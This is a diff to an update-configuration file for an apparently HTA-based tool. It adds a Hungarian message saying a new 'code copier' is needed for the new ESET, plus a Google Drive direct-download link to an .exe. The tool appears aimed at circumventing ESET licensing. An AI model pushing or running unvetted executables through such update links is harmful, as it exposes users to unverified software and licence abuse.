@@ -2,12 +2,14 @@
 |  Update file                   |
 +--------------------------------+
 
-[SHL] - latest version: 190305;
+[SHL] - latest version: 190310.0;
 [SHL] - notification message:
+Új Kódmásoló kell az új ESET-hez!
 
+Most frissíted?
 [SHL] - end of message;
-[SHL] - direct download link: ;
-[SHL] - downloaded file ext: ;
+[SHL] - direct download link: https://drive.google.com/uc?export=download&id=1cIqH8tyYqLrto_txR_Wqm4hGxLP8Jnkl;
+[SHL] - downloaded file ext: .exe;
 [SHL] - open web page: ;
 [SHL] - hta file re-open: true;
 [SHL] - text of hta file:
